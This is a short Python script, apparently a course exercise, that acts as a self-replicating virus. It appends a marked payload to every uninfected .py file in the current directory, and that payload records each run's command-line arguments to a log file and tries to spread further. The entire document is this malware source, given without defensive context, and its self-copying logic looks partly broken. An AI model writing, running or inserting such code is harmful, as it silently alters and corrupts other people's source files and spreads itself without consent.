import os
import sys

payload = """
## __virus
import sys
import os

with open("Q1C.out", "a") as f:
    f.write(f"{' '.join(sys.argv)}\\n")

for file in os.listdir('.'):
    if not file.endswith(".py"):
        continue

    infected = False
    with open(file, "r") as f:
        for line in f:
            if "## __virus" in line:
                infected = True
                break
    
    if not infected:
        with open(file, "a") as f:
            f.write(
                \"\"\"
                %s
                \"\"\"
            )

"""

if __name__ == '__main__':
    for file in os.listdir('.'):
        if not file.endswith(".py"):
            continue

        injected = False
        with open(file, "r") as f:
            for line in f:
                if "## __virus" in line:
                    injected = True
                    break

        if not injected:
            with open(file, "a") as f:
                f.write(payload % payload)